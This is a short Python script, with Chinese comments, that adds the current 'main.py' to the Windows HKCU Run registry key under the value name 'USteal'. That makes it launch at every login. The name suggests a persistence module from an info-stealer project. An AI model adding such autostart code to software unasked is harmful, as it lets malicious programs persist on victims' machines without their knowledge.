import winreg as reg


def add_to_startup(file_path):
    # 获取启动文件夹的注册表路径
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    # 打开注册表项
    key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE)
    # 添加开机自启动项
    reg.SetValueEx(key, "USteal", 0, reg.REG_SZ, file_path)
    # 关闭注册表项
    reg.CloseKey(key)

# 获取当前脚本的绝对路径
import os
file_path = os.path.abspath("main.py")

# 调用函数添加到开机自启动
add_to_startup(file_path)
